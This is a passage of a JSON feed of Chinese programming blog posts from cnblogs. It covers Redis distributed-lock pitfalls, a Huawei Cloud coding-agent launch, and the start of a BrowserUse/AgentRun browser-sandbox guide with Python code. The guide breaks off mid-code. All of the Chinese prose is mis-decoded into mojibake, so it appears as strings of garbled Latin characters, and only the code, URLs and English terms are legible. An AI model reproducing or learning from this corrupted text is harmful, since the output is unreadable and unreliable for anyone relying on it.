ã€æ¶ˆæ¯é˜Ÿåˆ—ï¼‰ï¼Œç¼©çŸ­é”æŒæœ‰æ—¶é—´ã€‚</p>\n</li>\n<li>\n<p>è®¾ç½®é”æŒæœ‰è¶…æ—¶é¢„è­¦ï¼šé€šè¿‡ç›‘æ§å·¥å…·ç»Ÿè®¡é”æŒæœ‰æ—¶é—´ï¼Œè¶…è¿‡é˜ˆå€¼ï¼ˆå¦‚ 20 ç§’ï¼‰æ—¶å‘Šè­¦ï¼ŒåŠæ—¶æ’æŸ¥è€—æ—¶ä¸šåŠ¡ã€‚</p>\n</li>\n</ul>\n<h3 id=\"é—®é¢˜-8é”-key-è®¾è®¡ä¸å½“é”ç²’åº¦é—®é¢˜å¼•å‘å¹¶å‘ç“¶é¢ˆ\">é—®é¢˜ 8ï¼šé” key è®¾è®¡ä¸å½“â€”â€”é”ç²’åº¦é—®é¢˜å¼•å‘å¹¶å‘ç“¶é¢ˆ</h3>\n<p><strong>æˆå› </strong>ï¼šé” key ç²’åº¦å¤ªç²—ï¼ˆå¦‚ç”¨â€œlock:stockâ€ä½œä¸ºæ‰€æœ‰å•†å“çš„åº“å­˜é”ï¼‰ï¼Œå¯¼è‡´æ‰€æœ‰å•†å“çš„åº“å­˜æ“ä½œéƒ½äº’æ–¥ï¼Œå³ä½¿æ“ä½œä¸åŒå•†å“ï¼Œä¹Ÿéœ€æ’é˜Ÿç­‰å¾…é”é‡Šæ”¾ï¼Œå½»åº•ä¸§å¤±åˆ†å¸ƒå¼ç³»ç»Ÿçš„å¹¶å‘ä¼˜åŠ¿ã€‚</p>\n<p><strong>è¡¨ç°</strong>ï¼šç³»ç»Ÿå¹¶å‘é‡æä½ï¼Œä¸åŒå•†å“çš„åº“å­˜æ‰£å‡è¯·æ±‚ä¸²è¡Œæ‰§è¡Œï¼Œæ¥å£ååé‡è¿œä½äºé¢„æœŸã€‚</p>\n<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šç²¾ç»†åŒ–è®¾è®¡é” keyï¼ŒæŒ‰å…·ä½“èµ„æºæ ‡è¯†æ‹†åˆ†é”ã€‚æ¯”å¦‚åº“å­˜é”ï¼Œç”¨â€œlock:stock:1001â€ï¼ˆ1001 ä¸ºå•†å“ IDï¼‰ä½œä¸ºé” keyï¼Œä»…å¯¹åŒä¸€å•†å“çš„åº“å­˜æ“ä½œäº’æ–¥ï¼Œä¸åŒå•†å“å¯å¹¶è¡Œå¤„ç†ï¼Œå¤§å¹…æå‡å¹¶å‘é‡ã€‚</p>\n<p>å»¶ä¼¸ï¼šé«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œå¯è¿›ä¸€æ­¥ç”¨â€œåˆ†æ®µé”â€æ‹†åˆ†èµ„æºï¼ˆå¦‚å°†å•†å“ ID å“ˆå¸Œåˆ° 10 ä¸ªåˆ†æ®µï¼Œé” key ä¸ºâ€œlock:stock:segment:1â€ï¼‰ï¼ŒåŒä¸€åˆ†æ®µäº’æ–¥ï¼Œä¸åŒåˆ†æ®µå¹¶è¡Œï¼Œè¿›ä¸€æ­¥æå‡å¹¶å‘èƒ½åŠ›ã€‚</p>\n<h3 id=\"é—®é¢˜-9ç½‘ç»œåˆ†åŒºå¯¼è‡´é”çŠ¶æ€ä¸ä¸€è‡´æç«¯åœºæ™¯ä¸‹çš„éšæ‚£\">é—®é¢˜ 9ï¼šç½‘ç»œåˆ†åŒºå¯¼è‡´é”çŠ¶æ€ä¸ä¸€è‡´â€”â€”æç«¯åœºæ™¯ä¸‹çš„éšæ‚£</h3>\n<p><strong>æˆå› </strong>ï¼šåˆ†å¸ƒå¼ç¯å¢ƒä¸­å‡ºç°ç½‘ç»œåˆ†åŒºï¼ŒæŒæœ‰é”çš„æœåŠ¡ä¸ Redis é›†ç¾¤éš”ç¦»ï¼Œæ— æ³•ä¸»åŠ¨é‡Šæ”¾é”ï¼Œä¹Ÿæ— æ³•æ¥æ”¶é”ç»­çº¦ä¿¡å·ï¼›é”è¿‡æœŸåï¼Œå…¶ä»–æœåŠ¡åŠ é”æˆåŠŸï¼›ç½‘ç»œæ¢å¤åï¼ŒåŸæŒæœ‰é”çš„æœåŠ¡è¯¯ä»¥ä¸ºé”ä»æœ‰æ•ˆï¼Œç»§ç»­æ“ä½œèµ„æºï¼Œå¯¼è‡´æ•°æ®å†²çªã€‚</p>\n<p><strong>è¡¨ç°</strong>ï¼šæç«¯ç½‘ç»œå¼‚å¸¸åï¼Œå‡ºç°æ•°æ®ä¸ä¸€è‡´ï¼Œä¸”é—®é¢˜éš¾ä»¥æ’æŸ¥ï¼ˆä¸ç½‘ç»œåˆ†åŒºæ—¶é—´ã€é”è¿‡æœŸæ—¶é—´å¼ºç›¸å…³ï¼‰ã€‚</p>\n<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>\n<ul>\n<li>\n<p>å¼•å…¥ä¸šåŠ¡æ ¡éªŒæœºåˆ¶ï¼šæ“ä½œèµ„æºå‰ï¼Œå†æ¬¡æ ¡éªŒèµ„æºçŠ¶æ€ï¼ˆå¦‚æ‰£å‡åº“å­˜å‰ï¼Œæ£€æŸ¥åº“å­˜æ˜¯å¦ä¸é¢„æœŸä¸€è‡´ï¼‰ï¼Œé¿å…åŸºäºè¿‡æœŸé”çš„æ— æ•ˆæ“ä½œã€‚</p>\n</li>\n<li>\n<p>ç¼©çŸ­é”è¿‡æœŸæ—¶é—´ï¼šç»“åˆ Watch Dog æœºåˆ¶ï¼Œå°†åŸºç¡€è¿‡æœŸæ—¶é—´è®¾çŸ­ï¼ˆå¦‚ 10 ç§’ï¼‰ï¼Œå‡å°‘ç½‘ç»œåˆ†åŒºå¯¼è‡´çš„é”çŠ¶æ€ä¸ä¸€è‡´çª—å£ã€‚</p>\n</li>\n<li>\n<p>ä½¿ç”¨ Redlock ç®—æ³•ï¼šå¤šä¸»èŠ‚ç‚¹æŠ•ç¥¨æœºåˆ¶ï¼Œå¯é™ä½ç½‘ç»œåˆ†åŒºå¯¹é”çŠ¶æ€çš„å½±å“ï¼Œæå‡ä¸€è‡´æ€§ã€‚</p>\n</li>\n</ul>\n<h2 id=\"äºŒç”Ÿäº§é¿å‘æ€»ç»“\">äºŒã€ç”Ÿäº§é¿å‘æ€»ç»“</h2>\n<p>Redis åˆ†å¸ƒå¼é”çš„é—®é¢˜ï¼Œå¤§å¤šä¸æ˜¯ Redis æœ¬èº«çš„ç¼ºé™·ï¼Œè€Œæ˜¯å¯¹åˆ†å¸ƒå¼åœºæ™¯çš„å¤æ‚æ€§è€ƒè™‘ä¸è¶³ã€‚ç»“åˆå®æˆ˜ç»éªŒï¼Œæ€»ç»“ 3 ä¸ªæ ¸å¿ƒé¿å‘åŸåˆ™ï¼š</p>\n<ol>\n<li>\n<p>ä¼˜å…ˆä½¿ç”¨æˆç†Ÿæ¡†æ¶ï¼šæ”¾å¼ƒæ‰‹åŠ¨å®ç°åˆ†å¸ƒå¼é”ï¼ŒRedisson å·²å°è£…è§£å†³ä¸Šè¿°æ‰€æœ‰é—®é¢˜ï¼Œå¼€ç®±å³ç”¨ï¼Œç¨³å®šæ€§è¿œé«˜äºè‡ªå®šä¹‰å®ç°ã€‚</p>\n</li>\n<li>\n<p>åŒ¹é…ä¸šåŠ¡åœºæ™¯é€‰å‹ï¼šé«˜ä¸€è‡´æ€§ã€é«˜å¯ç”¨åœºæ™¯ç”¨ Redlock ç®—æ³•ï¼›ä¸€èˆ¬åœºæ™¯ç”¨ä¸»ä» + å“¨å…µæ¨¡å¼ï¼›æ ¹æ®å¹¶å‘é‡è®¾è®¡é”ç²’åº¦ï¼ˆç²¾ç»†åŒ–/åˆ†æ®µé”ï¼‰ã€‚</p>\n</li>\n<li>\n<p>å®Œå–„ç›‘æ§ä¸å…œåº•ï¼šç›‘æ§é”æŒæœ‰æ—¶é—´ã€åŠ é”æˆåŠŸç‡ã€Redis é›†ç¾¤çŠ¶æ€ï¼Œè®¾ç½®å‘Šè­¦é˜ˆå€¼ï¼›åŠ é”å¤±è´¥ã€é”è¿‡æœŸç­‰åœºæ™¯ï¼Œéœ€æœ‰ä¸šåŠ¡å…œåº•ç­–ç•¥ï¼ˆé‡è¯•ã€è¿”å›å‹å¥½æç¤ºã€é˜Ÿåˆ—ç¼“å­˜ï¼‰ã€‚</p>\n</li>\n</ol>\n<p>æ€»ä¹‹ï¼ŒRedis åˆ†å¸ƒå¼é”çš„æ ¸å¿ƒæ˜¯â€œå…¼é¡¾äº’æ–¥æ€§ä¸é«˜å¯ç”¨â€ï¼Œé¿å¼€ä¸Šè¿°é—®é¢˜åï¼Œæ‰èƒ½çœŸæ­£æˆä¸ºåˆ†å¸ƒå¼ç³»ç»Ÿè§£å†³å¹¶å‘å†²çªçš„åˆ©å™¨ï¼Œè€Œéç³»ç»Ÿçš„æ–°ç“¶é¢ˆã€‚</p>\n\n</div>\n<div id=\"MySignature\">\n    \n<p>â¤ï¸ å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç‚¹èµæ”¯æŒï¼ ğŸ‘ åŒæ—¶æ¬¢è¿å…³æ³¨æˆ‘çš„åšå®¢ï¼Œè·å–æ›´å¤šç²¾å½©å†…å®¹ï¼</p>\n\n<p>æœ¬æ–‡æ¥è‡ªåšå®¢å›­ï¼Œä½œè€…ï¼š<a href=\"https://www.cnblogs.com/sun-10387834/\" target=\"_blank\">ä½›ç¥–è®©æˆ‘æ¥å·¡å±±</a>ï¼Œè½¬è½½è¯·æ³¨æ˜åŸæ–‡é“¾æ¥ï¼š<a href=\"https://www.cnblogs.com/sun-10387834/p/19493006\" target=\"_blank\">https://www.cnblogs.com/sun-10387834/p/19493006</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 19:23</span>&nbsp;\n<a href=\"https://www.cnblogs.com/sun-10387834\">ä½›ç¥–è®©æˆ‘æ¥å·¡å±±</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">7</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "åä¸ºäº‘å‘å¸ƒCodeArts Doerä»£ç æ™ºèƒ½ä½“ä¸ªäººç‰ˆï¼šä¸€é”®å¼€å¯ä½ çš„ç¼–ç è‡ªåŠ¨é©¾é©¶æ¨¡å¼",
      "link": "https://www.cnblogs.com/huaweiyun/p/19508288",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/huaweiyun/p/19508288\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-20 18:34\">\n    <span>åä¸ºäº‘å‘å¸ƒCodeArts Doerä»£ç æ™ºèƒ½ä½“ä¸ªäººç‰ˆï¼šä¸€é”®å¼€å¯ä½ çš„ç¼–ç è‡ªåŠ¨é©¾é©¶æ¨¡å¼</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<div align=\"center\" style=\"text-align: left;\">2026å¹´1æœˆ16æ—¥ï¼Œåä¸ºäº‘æ­£å¼å‘å¸ƒCodeArts Doerä»£ç æ™ºèƒ½ä½“ã€‚è¿™æ¬¾æ·±åº¦èåˆAIåŸç”Ÿèƒ½åŠ›çš„æ™ºèƒ½ç¼–ç äº§å“ï¼Œé›†æˆäº†AI IDEã€Code Agentã€Codebaseä»£ç ä»“æ·±åº¦ç†è§£ç­‰æ ¸å¿ƒèƒ½åŠ›ï¼Œæ›´æ‡‚ç ”å‘éœ€æ±‚ã€ç²¾é€šç¼–ç ã€å–„ç”¨ç™¾å™¨ï¼Œä¸ºå¼€å‘è€…å¸¦æ¥ç„•æ–°ç ”å‘ä½“éªŒã€‚</div>\n<div style=\"text-align: left;\">&nbsp;<img alt=\"\" class=\"lazyload\" /></div>\n<p>æœ¬æ¬¡å‘å¸ƒçš„ä¸‰å¤§æ–°å“ç‰¹æ€§ï¼š AI IDEã€Code Agentã€Codebase</p>\n<p><strong>AI IDE</strong><strong>ï¼šåŸç”Ÿæ™ºèƒ½ï¼Œç„•æ–°å¼€å‘ä½“éªŒ</strong></p>\n<p>AI IDEä»¥AIåŸç”Ÿä¸ºèµ·ç‚¹ï¼Œå°†ç¼–ç èƒ½åŠ›ä¸æ™ºèƒ½ä½“æ·±åº¦èåˆï¼Œä¸ºå¼€å‘è€…å¸¦æ¥æ›´è‡ªç„¶çš„å¼€å‘å·¥ä½œæµï¼šä»éœ€æ±‚æè¿°åˆ°ä»»åŠ¡æ‹†è§£ï¼Œä»æ¥å£è®¾è®¡åˆ°ä»£ç è½åœ°ï¼Œåœ¨IDEå†…å³å¯å®Œæˆé—­ç¯ã€‚åŒæ—¶ï¼ŒAI IDEå†…ç½®ä¸“å®¶æŠ€èƒ½ä¸ç²¾é€‰å·¥å…·ï¼Œå½¢æˆâ€œäºº+AI+å·¥å…·â€çš„ååŒå¼€å‘å¹³å°ï¼šå¼€å‘è€…ä¸“æ³¨ä¸šåŠ¡åˆ¤æ–­ä¸å…³é”®å†³ç­–ï¼ŒAI IDEè´Ÿè´£é«˜é¢‘ã€é‡å¤ã€æ˜“é—æ¼çš„å·¥ç¨‹åŒ–å·¥ä½œï¼Œè®©ä½“éªŒä»â€œå¤šå¼€çª—å£æ‰¾å·¥å…·â€å‡çº§ä¸ºâ€œåœ¨ä¸€ä¸ªå·¥ä½œå°é‡Œå®Œæˆäº¤ä»˜â€ã€‚</p>\n<p>&nbsp;<img alt=\"\" class=\"lazyload\" /></p>\n<p><strong>Code Agent</strong><strong>ï¼šå·¦æ‰‹ç¼–ç è‡ªç”±ï¼Œå³æ‰‹è§„èŒƒé«˜æ•ˆ</strong></p>\n<p>CodeArts Doerä»£ç æ™ºèƒ½ä½“æä¾›ä¸¤ç§é¢å‘ä¸åŒé˜¶æ®µä¸è¯‰æ±‚çš„å¼€å‘æ¨¡å¼ï¼š</p>\n<p>æ¢ç´¢æ¨¡å¼ï¼šæ›´å¼ºè°ƒäººæœºååŒä¸åˆ›é€ åŠ›ã€‚ä½ å¯ä»¥ç”¨è‡ªç„¶è¯­è¨€æè¿°éœ€æ±‚ç›®æ ‡ï¼Œè®©CodeArts Doerä»£ç æ™ºèƒ½ä½“ä¸ºä½ è§„åˆ’å¹¶åˆ†è§£é¡¹ç›®ä»»åŠ¡ï¼Œç”Ÿæˆé¡¹ç›®çº§ä»£ç ã€è¿›è¡ŒAgentçŸ¥è¯†å¢å¼ºã€ä»£ç ç»­å†™ï¼Œå¹¶åœ¨å¤šè½®å¯¹è¯ä¸­æŒç»­è¿­ä»£ï¼ŒæŠŠâ€œæƒ³æ³•â€å¿«é€Ÿæ¨è¿›åˆ°â€œå¯è¿è¡Œâ€ã€‚</p>\n<p>è§„èŒƒæ¨¡å¼ï¼šæ›´å¼ºè°ƒè´¨é‡ã€å®‰å…¨ä¸ä¸€è‡´æ€§ã€‚è§„èŒƒé©±åŠ¨å¼€å‘ï¼Œè®©ä»£ç éµä»æ ‡å‡†æµç¨‹ç”Ÿæˆã€‚åœ¨ç”Ÿæˆä¸ä¿®æ”¹ä»£ç è¿‡ç¨‹ä¸­å¯¹é½è§„èŒƒï¼Œæå‡ä»£ç çš„å¯è¯»æ€§ã€å¯ç»´æŠ¤æ€§ï¼ŒåŒæ—¶åœ¨å…³é”®ç‚¹è¿›è¡Œå®‰å…¨ä¸è´¨é‡æ ¡éªŒï¼Œå¸®åŠ©å›¢é˜ŸæŠŠâ€œå¿«â€å»ºç«‹åœ¨â€œç¨³â€çš„åŸºç¡€ä¸Šã€‚</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p><strong>Codebase</strong><strong>ï¼šä»£ç ä»“æ·±åº¦ç†è§£ï¼Œæœ€æ‡‚ä½ çš„AIç¼–ç ä¸“å®¶</strong></p>\n<p>çœŸæ­£é€‚ç”¨äºç”Ÿäº§ç¯å¢ƒçš„AIç¼–ç ï¼Œå…³é”®åœ¨äºâ€œç†è§£ä½ çš„é¡¹ç›®â€ã€‚Codebaseæ”¯æŒç™¾ä¸‡è¡Œçº§ä»£ç ç´¢å¼•ã€çŸ¥è¯†å›¾è°±æ„å»ºã€æ–‡æ¡£ç”Ÿæˆä¸æ¼”åŒ–å†å²çŸ¥è¯†æ²‰æ·€ï¼Œå‡†ç¡®ç†è§£ä»£ç ä»“ç»“æ„ã€ä¾èµ–å…³ç³»ä¸ä¸šåŠ¡è¾¹ç•Œï¼ŒåŒ–èº«æˆä¸€ä½ä¸“å±çš„ä»£ç çŸ¥è¯†ä¸“å®¶ï¼Œå¸®åŠ©æ–°æˆå‘˜å¿«é€Ÿä¸Šæ‰‹ã€è€æˆå‘˜å¿«é€Ÿå®šä½ã€‚åŒæ—¶ï¼Œå‡†ç¡®æ£€ç´¢èƒ½åŠ›è®©AIæ›´å¿«æ‰¾åˆ°ä½ çœŸæ­£éœ€è¦çš„å‡½æ•°ã€æ¥å£ä¸å®ç°ç»†èŠ‚ï¼Œå‡å°‘â€œçœ‹ä¼¼æ­£ç¡®ã€å®åˆ™ä¸é€‚é…â€çš„ç”Ÿæˆå†…å®¹ï¼Œè®©æ¯ä¸€æ¬¡å»ºè®®éƒ½æ›´è´´è¿‘é¡¹ç›®ç°å®ã€‚</p>\n<p>&nbsp;<img alt=\"\" class=\"lazyload\" /></p>\n<p><strong>å¤šç§ç”¨æˆ·åœºæ™¯ï¼šè®©ç ”å‘ä»â€œäººåŠ›ä¸»å¯¼â€èµ°å‘â€œäººæœºå…±åˆ›â€</strong></p>\n<p>CodeArts Doerä»£ç æ™ºèƒ½ä½“å·²åœ¨é¡¹ç›®çº§ä»£ç ç”Ÿæˆã€AgentçŸ¥è¯†å¢å¼ºã€ä»£ç ç»­å†™ã€ç ”å‘çŸ¥è¯†é—®ç­”ã€å•å…ƒæµ‹è¯•ç”Ÿæˆç­‰åœºæ™¯å®ç°å¼€å‘è€…æ•ˆç‡æå‡ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒä¸°å¯Œå·¥å…·ç”Ÿæ€ï¼ŒåŠ©åŠ›é«˜æ•ˆå¼€å‘ä¸ä¸ªæ€§åŒ–å®šåˆ¶ã€‚</p>\n<p>ç›®å‰ï¼ŒCodeArts Doerä»£ç æ™ºèƒ½ä½“ä¸ªäººç‰ˆå·²ç»æ­£å¼å‘å¸ƒï¼Œé¢å‘å¹¿å¤§å¼€å‘è€…å¼€æ”¾å…è´¹ä½“éªŒã€‚è®©AIçœŸæ­£èµ°è¿›å·¥ç¨‹ã€èµ°è¿›æµç¨‹ã€èµ°è¿›äº¤ä»˜â€”â€”ä»ä»Šå¤©èµ·ï¼Œå¼€å¯ä½ çš„ç¼–ç è‡ªåŠ¨é©¾é©¶æ¨¡å¼ã€‚</p>\n<p>ä½“éªŒCodeArts Doerä»£ç æ™ºèƒ½ä½“ï¼š<a href=\"https://developer.huaweicloud.com/signup/78745481cafb4d79bf62096f6770c72e?channelCode=hcdg\" rel=\"noopener nofollow\" target=\"_blank\">https://developer.huaweicloud.com/signup/78745481cafb4d79bf62096f6770c72e?channelCode=hcdg</a></p>\n<p>&nbsp;</p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 18:34</span>&nbsp;\n<a href=\"https://www.cnblogs.com/huaweiyun\">åä¸ºäº‘å¼€å‘è€…è”ç›Ÿ</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">22</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "è¿›é˜¶æŒ‡å—ï¼šBrowserUse + Agentrun Sandbox æœ€ä½³å®è·µæŒ‡å—",
      "link": "https://www.cnblogs.com/Serverless/p/19507367",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Serverless/p/19507367\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-20 16:12\">\n    <span>è¿›é˜¶æŒ‡å—ï¼šBrowserUse + Agentrun Sandbox æœ€ä½³å®è·µæŒ‡å—</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p><strong>æç¤º</strong>: æœ¬æ–‡æ˜¯AgentRun Browser Sandbox å¿«é€Ÿä¸Šæ‰‹å®è·µæŒ‡å—çš„å§Šå¦¹ç¯‡,ä¸“æ³¨äºé«˜çº§é›†æˆæ–¹æ¡ˆã€ç”Ÿäº§ç¯å¢ƒçš„æœ€ä½³å®è·µã€æ€§èƒ½ä¼˜åŒ–å’Œéƒ¨ç½²ç­–ç•¥ã€‚å¦‚æœæ‚¨è¿˜æ²¡æœ‰å®ŒæˆåŸºç¡€å­¦ä¹ ,è¯·å…ˆé˜…è¯»<a href=\"https://mp.weixin.qq.com/s/2LjN6LxymuZNlWUR-nhrEg\" rel=\"noopener nofollow\" target=\"_blank\">ã€Šå¿«é€Ÿä¸Šæ‰‹ï¼šLangChain + AgentRun æµè§ˆå™¨æ²™ç®±æç®€é›†æˆæŒ‡å—ã€‹</a>ã€‚</p>\n</blockquote>\n<h2 id=\"å‰è¨€\">å‰è¨€</h2>\n<p>åœ¨å®Œæˆäº† Browser Sandbox çš„åŸºç¡€é›†æˆä¹‹åï¼Œæœ¬æ–‡å°†ä»‹ç»é«˜çº§é›†æˆæ–¹æ¡ˆï¼ˆå¦‚ BrowserUse æ¡†æ¶ï¼‰ä»¥åŠç”Ÿäº§ç¯å¢ƒéƒ¨ç½²éœ€è¦è€ƒè™‘çš„å› ç´ ï¼šå¦‚ä½•ç®¡ç† Sandbox ç”Ÿå‘½å‘¨æœŸï¼Ÿå¦‚ä½•ä¼˜åŒ–æ€§èƒ½å’Œæˆæœ¬ï¼Ÿå¦‚ä½•ä¿è¯ç³»ç»Ÿçš„å®‰å…¨æ€§å’Œå¯è§‚æµ‹æ€§ï¼Ÿæœ¬æ–‡å°†ä¸ºæ‚¨æä¾›å…¨é¢çš„é«˜çº§åº”ç”¨å’Œç”Ÿäº§ç¯å¢ƒæœ€ä½³å®è·µæŒ‡å—ã€‚</p>\n<h2 id=\"åŸºäº-browseruse-é›†æˆ-browser-sandbox\">åŸºäº BrowserUse é›†æˆ Browser Sandbox</h2>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>&lt;æ•ˆæœæˆªå›¾&gt;</p>\n<p>BrowserUse æ˜¯ä¸€ä¸ªä¸“é—¨ä¸º AI Agent è®¾è®¡çš„æµè§ˆå™¨è‡ªåŠ¨åŒ–æ¡†æ¶,æ”¯æŒè§†è§‰ç†è§£å’Œæ™ºèƒ½å†³ç­–ã€‚é€šè¿‡ AgentRun Browser Sandboxï¼Œæ‚¨å¯ä»¥è®© BrowserUse åœ¨äº‘ç«¯è¿è¡Œ,äº«å— Serverless æ¶æ„çš„ä¼˜åŠ¿ã€‚</p>\n<h3 id=\"browseruse-æ¶æ„æ¦‚è§ˆ\">BrowserUse æ¶æ„æ¦‚è§ˆ</h3>\n<p>ä¸‹å›¾å±•ç¤ºäº† BrowserUse ä¸ Browser Sandbox çš„é›†æˆæ¶æ„ï¼š</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p><strong>æ¶æ„ç‰¹ç‚¹ï¼š</strong></p>\n<ol>\n<li><strong>æ™ºèƒ½å†³ç­–å¾ªç¯</strong>ï¼šAgent é€šè¿‡ LLM åˆ†æé¡µé¢æˆªå›¾,åŸºäºè§†è§‰ç†è§£ç”Ÿæˆæ“ä½œæŒ‡ä»¤ï¼Œæ‰§è¡Œæ“ä½œåç»§ç»­å¾ªç¯ï¼Œç›´åˆ°ä»»åŠ¡å®Œæˆ</li>\n<li><strong>æ— å¤´æµè§ˆå™¨æ§åˆ¶</strong>ï¼šé€šè¿‡ CDP åè®®è¿œç¨‹æ§åˆ¶äº‘ç«¯æµè§ˆå™¨ï¼ŒPlaywright ä½œä¸ºåº•å±‚é©±åŠ¨ï¼Œæ‰€æœ‰æ“ä½œåœ¨äº‘ç«¯æ‰§è¡Œ</li>\n<li><strong>å®æ—¶å¯è§†åŒ–</strong>ï¼šVNC æä¾›å®æ—¶ç”»é¢ç›‘æ§,æ–¹ä¾¿è°ƒè¯•å’ŒéªŒè¯ Agent è¡Œä¸º</li>\n</ol>\n<h3 id=\"å¿«é€Ÿå¼€å§‹\">å¿«é€Ÿå¼€å§‹</h3>\n<h4 id=\"å®‰è£…ä¾èµ–\">å®‰è£…ä¾èµ–</h4>\n<pre><code class=\"language-bash\">pip install browser-use python-dotenv agentrun-sdk[playwright,server]\n</code></pre>\n<p>ä¸»è¦ä¾èµ–è¯´æ˜ï¼š</p>\n<ul>\n<li><code>browser-use</code>: BrowserUse æ ¸å¿ƒåº“,æ”¯æŒå¤šæ¨¡æ€ LLM</li>\n<li><code>agentrun-sdk[playwright,server]</code>: AgentRun SDKï¼Œç”¨äºåˆ›å»º Sandbox</li>\n<li><code>python-dotenv</code>: ç¯å¢ƒå˜é‡ç®¡ç†</li>\n</ul>\n<h4 id=\"é…ç½®ç¯å¢ƒå˜é‡\">é…ç½®ç¯å¢ƒå˜é‡</h4>\n<p>åˆ›å»º <code>.env</code> æ–‡ä»¶ï¼š</p>\n<pre><code class=\"language-bash\"># DashScope API Keyï¼ˆç”¨äº Qwen æ¨¡å‹ï¼‰\nDASHSCOPE_API_KEY=sk-your-dashscope-api-key\n\n# AgentRun è®¤è¯ä¿¡æ¯\nAGENTRUN_ACCOUNT_ID=your-account-id\nALIBABA_CLOUD_ACCESS_KEY_ID=your-access-key-id\nALIBABA_CLOUD_ACCESS_KEY_SECRET=your-access-key-secret\n\n# Browser Sandbox æ¨¡æ¿åç§°\nBROWSER_TEMPLATE_NAME=sandbox-browser-demo\n</code></pre>\n<h4 id=\"åˆ›å»º-sandbox-å¹¶ä½¿ç”¨-browseruse\">åˆ›å»º Sandbox å¹¶ä½¿ç”¨ BrowserUse</h4>\n<pre><code class=\"language-python\">import asyncio\nimport os\nfrom agentrun.sandbox import Sandbox, TemplateType\nfrom browser_use import Agent, BrowserSession, ChatOpenAI\nfrom browser_use.browser import BrowserProfile\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\nasync def main():\n    # åˆ›å»º Browser Sandbox\n    sandbox = Sandbox.create(\n        template_type=TemplateType.BROWSER,\n        template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n        sandbox_idle_timeout_seconds=3000\n    )\n    \n    # é…ç½® Qwen å¤šæ¨¡æ€æ¨¡å‹\n    llm = ChatOpenAI(\n        model='qwen-vl-max',\n        api_key=os.getenv(\"DASHSCOPE_API_KEY\"),\n        base_url=\"https://dashscope.aliyuncs.com/compatible-mode/v1\"\n    )\n    \n    # åˆ›å»ºæµè§ˆå™¨ä¼šè¯\n    browser_session = BrowserSession(\n        cdp_url=sandbox.get_cdp_url(),\n        browser_profile=BrowserProfile(\n            headless=False,\n            timeout=3000000,\n            keep_alive=True\n        )\n    )\n    \n    # åˆ›å»º Agent å¹¶æ‰§è¡Œä»»åŠ¡\n    agent = Agent(\n        task=\"è®¿é—®é˜¿é‡Œäº‘å®˜ç½‘å¹¶æ€»ç»“ä¸»è¦äº§å“åˆ†ç±»\",\n        llm=llm,\n        browser_session=browser_session,\n        use_vision=True\n    )\n    \n    result = await agent.run()\n    \n    print(f\"ä»»åŠ¡ç»“æœ: {result.final_result()}\")\n    \n    # æ¸…ç†èµ„æº\n    await browser_session.stop()\n    sandbox.delete()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n</code></pre>\n<h3 id=\"browseruse-é«˜çº§é…ç½®\">BrowserUse é«˜çº§é…ç½®</h3>\n<h4 id=\"è‡ªå®šä¹‰æµè§ˆå™¨è¡Œä¸º\">è‡ªå®šä¹‰æµè§ˆå™¨è¡Œä¸º</h4>\n<pre><code class=\"language-python\">browser_profile = BrowserProfile(\n    timeout=3000000,             # è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰\n    keep_alive=True,             # ä¿æŒä¼šè¯æ´»è·ƒ\n)\n</code></pre>\n<h4 id=\"å¤šæ­¥éª¤ä»»åŠ¡ç¼–æ’\">å¤šæ­¥éª¤ä»»åŠ¡ç¼–æ’</h4>\n<pre><code class=\"language-python\">async def complex_task():\n    \"\"\"å¤æ‚çš„å¤šæ­¥éª¤ä»»åŠ¡\"\"\"\n    sandbox = Sandbox.create(\n        template_type=TemplateType.BROWSER,\n        template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n        sandbox_idle_timeout_seconds=3000\n    )\n    \n    llm = ChatOpenAI(\n        model='qwen-vl-max',\n        api_key=os.getenv(\"DASHSCOPE_API_KEY\"),\n        base_url=\"https://dashscope.aliyuncs.com/compatible-mode/v1\"\n    )\n    \n    browser_session = BrowserSession(\n        cdp_url=sandbox.cdp_url,\n        browser_profile=BrowserProfile(keep_alive=True)\n    )\n    \n    # ä»»åŠ¡ 1ï¼šä¿¡æ¯æ”¶é›†\n    agent1 = Agent(\n        